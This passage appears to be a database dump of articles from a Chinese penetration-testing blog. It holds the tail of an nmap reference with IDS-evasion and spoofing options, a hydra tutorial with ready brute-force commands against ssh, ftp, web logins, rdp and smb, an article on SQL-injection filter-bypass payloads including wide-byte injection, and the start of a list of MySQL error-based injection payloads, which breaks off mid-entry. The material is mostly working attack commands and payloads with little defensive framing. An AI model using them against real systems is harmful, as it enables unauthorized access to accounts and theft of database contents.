调用的脚本传递的参数<br/>--script-args-file=filename&nbsp;&nbsp;&nbsp;&nbsp; 使用文本传递参数<br/>--script-trace&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显示所有发送和接收到的数据<br/>--script-updatedb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更新脚本的数据库<br/>--script-help=”Lua script”&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显示指定脚本的帮助<br/><br/>OS识别<br/><br/>-O&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 启用操作系统检测,-A来同时启用操作系统检测和版本检测<br/>--osscan-limit&nbsp; 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)<br/>--osscan-guess&nbsp; 推测操作系统检测结果,当Nmap无法确定所检测的操作系统时会尽可能地提供最相近的匹配Nmap默认进行这种匹配<br/><br/>防火墙/IDS躲避和哄骗<br/><br/>-f; --mtu value&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定使用分片、指定数据包的MTU.<br/>-D decoy1,decoy2,ME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 使用诱饵隐蔽扫描<br/>-S IP-ADDRESS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 源地址欺骗<br/>-e interface&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 使用指定的接口<br/>-g/ --source-port PROTNUM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 使用指定源端口 &nbsp;<br/>--proxies url1,[url2],...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 使用HTTP或者SOCKS4的代理 <br/><br/>--data-length NUM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 填充随机数据让数据包长度达到NUM<br/>--ip-options OPTIONS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 使用指定的IP选项来发送数据包<br/>--ttl VALUE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 设置IP time-to-live域<br/>--spoof-mac ADDR/PREFIX/VEBDOR&nbsp; MAC地址伪装<br/>--badsum&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 使用错误的checksum来发送数据包<br/><br/>Nmap 输出<br/><br/>-oN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 将标准输出直接写入指定的文件<br/>-oX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 输出xml文件<br/>-oS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 将所有的输出都改为大写<br/>-oG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 输出便于通过bash或者perl处理的格式,非xml<br/>-oA BASENAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 可将扫描结果以标准格式、XML格式和Grep格式一次性输出<br/>-v&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 提高输出信息的详细度<br/>-d level&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 设置debug级别,最高是9<br/>--reason&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显示端口处于带确认状态的原因<br/>--open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 只输出端口状态为open的端口<br/>--packet-trace&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显示所有发送或者接收到的数据包<br/>--iflist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显示路由信息和接口,便于调试<br/>--log-errors&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 把日志等级为errors/warings的日志输出<br/>--append-output&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 追加到指定的文件<br/>--resume FILENAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 恢复已停止的扫描<br/>--stylesheet PATH/URL&nbsp;&nbsp; 设置XSL样式表转换XML输出<br/>--webxml&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 从namp.org得到XML的样式<br/>--no-sytlesheet&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 忽略XML声明的XSL样式表<br/><br/>其他nmap选项<br/><br/>-6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 开启IPv6<br/>-A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OS识别,版本探测,脚本扫描和traceroute<br/>--datedir DIRNAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明用户Nmap数据文件位置<br/>--send-eth / --send-ip&nbsp; 使用原以太网帧发送/在原IP层发送<br/>--privileged&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 假定用户具有全部权限<br/>--unprovoleged&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 假定用户不具有全部权限,创建原始套接字需要root权限<br/>-V&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 打印版本信息<br/>-h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 输出帮助<br/><br/><br/></p>', 'nmap', 1, 1, '2019-03-02', 60, -2, 0, '/upload/image/20190302/bd6b4eb4f51cdce5262183efff3fb076.jpg'),
	(99, 'hydra讲解', 'aomaha', '<pre class="hljs ruby">一，参数说明\r\nhydra&nbsp;[[[-l&nbsp;LOGIN|-L&nbsp;FILE]&nbsp;[-p&nbsp;PASS|-P&nbsp;FILE]]&nbsp;|&nbsp;[-C&nbsp;FILE]]&nbsp;[-e&nbsp;ns]\r\n\r\n[-o&nbsp;FILE]&nbsp;[-t&nbsp;TASKS]&nbsp;[-M&nbsp;FILE&nbsp;[-T&nbsp;TASKS]]&nbsp;[-w&nbsp;TIME]&nbsp;[-f]&nbsp;[-s&nbsp;PORT]&nbsp;[-S]&nbsp;[-vV]&nbsp;\r\n\r\n[server](http://www.ha97.com/tag/server)\r\n\r\n&nbsp;service&nbsp;[OPT]\r\n\r\n-R&nbsp;继续从上一次进度接着破解。\r\n\r\n-S&nbsp;采用SSL链接。\r\n\r\n-s&nbsp;PORT&nbsp;可通过这个参数指定非默认端口。\r\n\r\n-l&nbsp;LOGIN&nbsp;指定破解的用户，对特定用户破解。\r\n\r\n-L&nbsp;FILE&nbsp;指定用户名字典。\r\n\r\n-p&nbsp;PASS&nbsp;小写，指定密码破解，少用，一般是采用密码字典。\r\n\r\n-P&nbsp;FILE&nbsp;大写，指定密码字典。\r\n\r\n-e&nbsp;ns&nbsp;可选选项，n：空密码试探，s：使用指定用户和密码试探。\r\n\r\n-C&nbsp;FILE&nbsp;使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。\r\n\r\n-M&nbsp;FILE&nbsp;指定目标列表文件一行一条。\r\n\r\n-o&nbsp;FILE&nbsp;指定结果输出文件。\r\n\r\n-f&nbsp;在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。\r\n\r\n-t&nbsp;TASKS&nbsp;同时运行的线程数，默认为16。\r\n\r\n-w&nbsp;TIME&nbsp;设置最大超时的时间，单位秒，默认是30s。\r\n\r\n-v&nbsp;/&nbsp;-V&nbsp;显示详细过程。\r\n\r\nserver&nbsp;目标ip\r\n\r\nservice&nbsp;指定服务名，支持的服务和协议：telnet&nbsp;ftp&nbsp;pop3[-ntlm]&nbsp;imap[-ntlm]&nbsp;smb&nbsp;smbnt&nbsp;http-{head|get}&nbsp;http-{get|post}-form&nbsp;http-proxy&nbsp;cisco&nbsp;cisco-enable&nbsp;vnc&nbsp;ldap2&nbsp;ldap3&nbsp;mssql&nbsp;mysql&nbsp;oracle-listener&nbsp;postgres&nbsp;nntp&nbsp;socks5&nbsp;rexec&nbsp;rlogin&nbsp;pcnfs&nbsp;snmp&nbsp;rsh&nbsp;cvs&nbsp;svn&nbsp;icq&nbsp;sapr3&nbsp;ssh&nbsp;smtp-auth[-ntlm]&nbsp;pcanywhere&nbsp;teamspeak&nbsp;sip&nbsp;vmauthd&nbsp;firebird&nbsp;ncp&nbsp;afp等等。\r\n\r\nOPT&nbsp;可选项</pre><p><br/></p><p>二，各种用法</p><p>输出到文件里。如果字典够强大，结合社工，密码不用很久就出来。<br/>1、破解ssh：</p><pre class="hljs cpp">hydra&nbsp;-l&nbsp;用户名&nbsp;-p&nbsp;密码字典&nbsp;-t&nbsp;线程&nbsp;-vV&nbsp;-e&nbsp;ns&nbsp;ip&nbsp;ssh\r\nhydra&nbsp;-l&nbsp;用户名&nbsp;-p&nbsp;密码字典&nbsp;-t&nbsp;线程&nbsp;-o&nbsp;save.log&nbsp;-vV&nbsp;ip&nbsp;ssh</pre><p>2、破解ftp：</p><pre class="hljs undefined">hydra&nbsp;ip&nbsp;ftp&nbsp;-l&nbsp;用户名&nbsp;-P&nbsp;密码字典&nbsp;-t&nbsp;线程(默认16)&nbsp;-vV\r\nhydra&nbsp;ip&nbsp;ftp&nbsp;-l&nbsp;用户名&nbsp;-P&nbsp;密码字典&nbsp;-e&nbsp;ns&nbsp;-vV</pre><p>3、get方式提交，破解web登录：</p><pre class="hljs undefined">hydra&nbsp;-l&nbsp;用户名&nbsp;-p&nbsp;密码字典&nbsp;-t&nbsp;线程&nbsp;-vV&nbsp;-e&nbsp;ns&nbsp;ip&nbsp;http-get&nbsp;/admin/\r\nhydra&nbsp;-l&nbsp;用户名&nbsp;-p&nbsp;密码字典&nbsp;-t&nbsp;线程&nbsp;-vV&nbsp;-e&nbsp;ns&nbsp;-f&nbsp;ip&nbsp;http-get&nbsp;/admin/index.php</pre><p>4、post方式提交，破解web登录：</p><pre class="hljs objectivec">hydra&nbsp;-l&nbsp;用户名&nbsp;-P&nbsp;密码字典&nbsp;-s&nbsp;80&nbsp;ip&nbsp;http-post-form&nbsp;&quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry&nbsp;password&quot;hydra&nbsp;-t&nbsp;3&nbsp;-l&nbsp;admin&nbsp;-P&nbsp;pass.txt&nbsp;-o&nbsp;out.txt&nbsp;-f&nbsp;10.36.16.18&nbsp;http-post-form&nbsp;&quot;login.php:id=^USER^&amp;passwd=^PASS^:&lt;title&gt;wrong&nbsp;username&nbsp;or&nbsp;password&lt;/title&gt;&quot;</pre><p>（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,&lt;title&gt;中的内容是表示错误猜解的返回信息提示。）</p><p>5、破解https：</p><pre class="hljs python">hydra&nbsp;-m&nbsp;/index.php&nbsp;-l&nbsp;muts&nbsp;-P&nbsp;pass.txt&nbsp;10.36.16.18&nbsp;https</pre><p>6、破解teamspeak：</p><pre class="hljs undefined">hydra&nbsp;-l&nbsp;用户名&nbsp;-P&nbsp;密码字典&nbsp;-s&nbsp;端口号&nbsp;-vV&nbsp;ip&nbsp;teamspeak</pre><p>7、破解cisco：</p><pre class="hljs css">hydra&nbsp;-P&nbsp;pass.txt&nbsp;10.36.16.18&nbsp;ciscohydra&nbsp;-m&nbsp;cloud&nbsp;-P&nbsp;pass.txt&nbsp;10.36.16.18&nbsp;cisco-enable</pre><p>8、破解smb：</p><pre class="hljs css">hydra&nbsp;-l&nbsp;administrator&nbsp;-P&nbsp;pass.txt&nbsp;10.36.16.18&nbsp;smb</pre><p>9、破解pop3：</p><pre class="hljs css">hydra&nbsp;-l&nbsp;muts&nbsp;-P&nbsp;pass.txt&nbsp;my.pop3.mail&nbsp;pop3</pre><p>10、破解rdp：</p><pre class="hljs python">hydra&nbsp;ip&nbsp;rdp&nbsp;-l&nbsp;administrator&nbsp;-P&nbsp;pass.txt&nbsp;-V</pre><p>11、破解http-proxy：</p><pre class="hljs cpp">hydra&nbsp;-l&nbsp;admin&nbsp;-P&nbsp;pass.txt&nbsp;http-proxy://10.36.16.18</pre><p>12、破解imap：</p><pre class="hljs cpp">hydra&nbsp;-L&nbsp;user.txt&nbsp;-p&nbsp;secret&nbsp;10.36.16.18&nbsp;imap&nbsp;PLAIN\r\nhydra&nbsp;-C&nbsp;defaults.txt&nbsp;-6&nbsp;imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</pre><p><br/></p>', 'hydra', 1, 19, '2019-03-03', 61, -2, -3, '/upload/image/20190303/1961fcfa07fbbe5df5cbefb2fdb81632.jpg'),
	(100, 'sql绕过技巧', '**', '<h2><span style="font-family: 宋体;">1.绕过空格（注释符</span>/* */，%a0<span style="font-family: 宋体;">）：</span></h2><p><span style="font-family: 宋体;">　　</span><span style="font-family: 宋体;"><code class="hljs perl">两个空格代替一个空格，用Tab代替空格，%a0=空格：</code></span></p><pre>%20&nbsp;%09&nbsp;%0a&nbsp;%0b&nbsp;%0c&nbsp;%0d&nbsp;%a0&nbsp;%00&nbsp;/**/&nbsp;&nbsp;/*!*/</pre><p><span style="font-family: 宋体;">&nbsp;&nbsp;</span><span style="font-family: 宋体;">最基本的绕过方法，用注释替换空格：</span></p><pre>/*&nbsp;&nbsp;注释&nbsp;*/</pre><p><img src="/upload/image/20190416/1555418435899543.png" alt=""/></p><p>使用浮点数：</p><pre>select&nbsp;*&nbsp;from&nbsp;users&nbsp;where&nbsp;id=8E0union&nbsp;select&nbsp;1,2,3select&nbsp;*&nbsp;from&nbsp;users&nbsp;where&nbsp;id=8.0&nbsp;select&nbsp;1,2,3</pre><h2><span style="font-family: 宋体;">2.括号绕过空格：</span></h2><p><span style="font-family: 宋体;">　　如果空格被过滤，括号没有被过滤，可以用括号绕过。</span></p><p><span style="font-family: 宋体;">　　在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</span></p><p><span style="font-family: 宋体;">例如：</span></p><pre>select(user())from&nbsp;dual&nbsp;where(1=1)and(2=2)</pre><p><span style="font-family: 宋体;">　　这种过滤方法常常用于time based盲注,例如：</span></p><pre>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</pre><p><span style="font-family: 宋体;">（from for属于逗号绕过下面会有）</span></p><p><span style="font-family: 宋体;">　　上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</span></p><h2><span style="font-family: 宋体;">3.引号绕过（<strong>使用十六进制</strong>）：</span></h2><p><span style="font-family: 宋体;">　　会使用到引号的地方一般是在最后的<code>where</code>子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</span></p><pre>select&nbsp;column_name&nbsp;&nbsp;from&nbsp;information_schema.tables&nbsp;where&nbsp;table_name=&quot;users&quot;</pre><p><span style="font-family: 宋体;">　　这个时候如果引号被过滤了，那么上面的<code>where</code>子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。</span><br/><span style="font-family: 宋体;"><code>　　users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</span></p><pre>select&nbsp;column_name&nbsp;&nbsp;from&nbsp;information_schema.tables&nbsp;where&nbsp;table_name=0x7573657273</pre><h2><span style="font-family: 宋体;">4.逗号绕过（<strong>使用from或者offset</strong>）：</span></h2><p><span style="font-family: 宋体;">　　在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用<code>from to</code>的方式来解决：</span></p><pre>select&nbsp;substr(database()&nbsp;from&nbsp;1&nbsp;for&nbsp;1);select&nbsp;mid(database()&nbsp;from&nbsp;1&nbsp;for&nbsp;1);</pre><p><span style="font-family: 宋体;">　　使用join：</span></p><p>&nbsp;</p><pre>union&nbsp;select&nbsp;1,2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#等价于union&nbsp;select&nbsp;*&nbsp;from&nbsp;(select&nbsp;1)a&nbsp;join&nbsp;(select&nbsp;2)b</pre><p>&nbsp;</p><p>　<span style="font-family: 宋体;">　使用like：</span></p><pre>select&nbsp;ascii(mid(user(),1,1))=80&nbsp;&nbsp;&nbsp;#等价于select&nbsp;user()&nbsp;like&nbsp;&#39;r%&#39;</pre><p>&nbsp;</p><p><span style="font-family: 宋体;">　　对于<code>limit</code>可以使用<code>offset</code>来绕过：</span></p><pre>select&nbsp;*&nbsp;from&nbsp;news&nbsp;limit&nbsp;0,1#&nbsp;等价于下面这条SQL语句select&nbsp;*&nbsp;from&nbsp;news&nbsp;limit&nbsp;1&nbsp;offset&nbsp;0</pre><h2><span style="font-family: 宋体;">5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）：</span></h2><h3><span style="font-family: 宋体;">使用greatest()、least（）：（前者返回最大值，后者返回最小值）</span></h3><p>&nbsp;</p><p><span style="font-family: 宋体;">　　同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到<code>greatest</code>来进行绕过了。<br/>　　最常见的一个盲注的sql语句：</span></p><pre>select&nbsp;*&nbsp;from&nbsp;users&nbsp;where&nbsp;id=1&nbsp;and&nbsp;ascii(substr(database(),0,1))&gt;64</pre><p><span style="font-family: 宋体;">　　此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用<code>greatest</code>来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。<br/>　　那么上面的这条sql语句可以使用<code>greatest</code>变为如下的子句:</span></p><pre>select&nbsp;*&nbsp;from&nbsp;users&nbsp;where&nbsp;id=1&nbsp;and&nbsp;greatest(ascii(substr(database(),0,1)),64)=64</pre><h3><span style="font-family: 宋体;">使用between and：<br/></span></h3><p><span style="font-family: 宋体;">&nbsp; &nbsp;between a and b：返回a，b之间的数据，不包含b。</span></p><h2><span style="font-family: 宋体;">6.or and xor not绕过：</span></h2><pre>and=&amp;&amp;&nbsp;&nbsp;or=||&nbsp;&nbsp;&nbsp;xor=|&nbsp;&nbsp;&nbsp;not=!</pre><h2><span style="font-family: 宋体;">7.绕过注释符号（#，--(后面跟一个空格））过滤：</span></h2><pre>id=1&#39;&nbsp;union&nbsp;select&nbsp;1,2,3||&#39;1</pre><p>　　最后的or &#39;1闭合查询语句的最后的单引号，或者：</p><pre>id=1&#39;&nbsp;union&nbsp;select&nbsp;1,2,&#39;3</pre><h2><span style="font-family: 宋体;">8.=绕过：</span></h2><p><span style="font-family: 宋体;"><span style="font-family: 宋体;">　　使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</span></span></p><h2><span style="font-family: 宋体;">9.绕过union，select，where等：</span></h2><h3><span style="font-family: 宋体;">（1）使用注释符绕过：</span></h3><p><span style="font-family: 宋体;">　　常用注释符：</span></p><pre>//，--&nbsp;,&nbsp;/**/,&nbsp;#,&nbsp;--+,&nbsp;--&nbsp;-,&nbsp;;,%00,--a</pre><p>　　<span style="font-family: 宋体;">用法：</span></p><pre>U/**/&nbsp;NION&nbsp;/**/&nbsp;SE/**/&nbsp;LECT&nbsp;/**/user，pwd&nbsp;from&nbsp;user</pre><h3><span style="font-family: 宋体;">（2）使用大小写绕过：</span></h3><pre>id=-1&#39;UnIoN/**/SeLeCT</pre><h3><span style="font-family: 宋体;">（3）内联注释绕过：</span></h3><pre>id=-1&#39;/*!UnIoN*/&nbsp;SeLeCT&nbsp;1,2,concat(/*!table_name*/)&nbsp;FrOM&nbsp;/*information_schema*/.tables&nbsp;/*!WHERE&nbsp;*//*!TaBlE_ScHeMa*/&nbsp;like&nbsp;database()#</pre><h3><span style="font-family: 宋体;">（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：</span></h3><pre>id=-1&#39;UNIunionONSeLselectECT1,2,3–-</pre><h2><span style="font-family: 宋体;">10.通用绕过（编码）：</span></h2><p><span style="font-family: 宋体;">　　如URLEncode编码，ASCII,HEX,unicode编码绕过：</span></p><pre>or&nbsp;1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</pre><h2><span style="font-family: 宋体;">11.等价函数绕过：</span></h2><p><span class="cnblogs_code_copy"><a title="复制代码"><img src="/upload/image/20190416/1555418435540568.gif" alt="复制代码"/></a></span></p><pre>hex()、bin()&nbsp;==&gt;&nbsp;ascii()\r\n\r\nsleep()&nbsp;==&gt;benchmark()\r\n\r\nconcat_ws()==&gt;group_concat()\r\n\r\nmid()、substr()&nbsp;==&gt;&nbsp;substring()@@user&nbsp;==&gt;&nbsp;user()@@datadir&nbsp;==&gt;&nbsp;datadir()\r\n\r\n举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　\r\n\r\n或者：\r\nsubstr((select&nbsp;&#39;password&#39;),1,1)&nbsp;=&nbsp;0x70strcmp(left(&#39;password&#39;,1),&nbsp;0x69)&nbsp;=&nbsp;1strcmp(left(&#39;password&#39;,1),&nbsp;0x70)&nbsp;=&nbsp;0strcmp(left(&#39;password&#39;,1),&nbsp;0x71)&nbsp;=&nbsp;-1</pre><p><span class="cnblogs_code_copy"><a title="复制代码"><img src="/upload/image/20190416/1555418435540568.gif" alt="复制代码"/></a></span></p><h2><span style="font-family: 宋体;">12.宽字节注入：</span></h2><p><span style="font-family: 宋体;">　　过滤 &#39; 的时候往往利用的思路是将 &#39; 转换为 \\&#39; 。<br/></span></p><p><span style="font-family: 宋体;">　　在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</span></p><p><span style="font-family: 宋体;">　　（1）%df 吃掉 \\ 具体的方法是 urlencode(&#39;\\) = \r\n%5c%27，我们在 %5c%27 前面添加 %df ，形成&nbsp;%df%5c%27 ，而 mysql 在 GBK \r\n编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（&#39;）符号在外面：</span></p><pre>id=-1%df%27union&nbsp;select&nbsp;1,user(),3--+</pre><p><span style="font-family: 宋体;">　　（2）将 \\&#39; 中的 \\ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的&nbsp;%5c 会被前面的&nbsp;%5c 注释掉。</span></p><h3><span style="font-family: 宋体;">一般产生宽字节注入的PHP函数：</span></h3><p><span style="font-family: 宋体;">&nbsp; &nbsp;1.replace（）：过滤 &#39; \\ ，将 &#39; 转化为 \\&#39; ，将 \\ &nbsp;转为 \\\\，将 &quot; 转为 \\&quot; 。用思路一。</span></p><p><span style="font-family: 宋体;">&nbsp; &nbsp;2.addslaches()：返回在预定义字符之前添加反斜杠（\\）的字符串。预定义字符：&#39; , &quot; , \\ 。用思路一</span></p><p><span style="font-family: 宋体;">（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</span></p><p><span style="font-family: 宋体;">　 　3.mysql_real_escape_string()：转义下列字符：</span></p><pre>\\x00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\\r&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\\x1a</pre><p><span style="font-family: 宋体;">（防御，将mysql设置为gbk即可）</span></p><p><br/></p>', 'sql', 0, 5, '2019-04-16', 62, -2, 0, '/upload/image/20190416/fa86afa209652fa3ac9195dc1ff41a4c.jpg'),
	(101, '10种报错注入(mysql)', '**', '<p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">1.floor()</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体"><br/></span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">2.extractvalue()</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体"><br/></span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">3.updatexml()</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体"><br/></span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">4.geometrycollection()</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体"><br/></span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">5.multipoint()</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体"></span><br/></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">6.polygon()</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">select * from test where id=1 and polygon((select * from(select * from(select 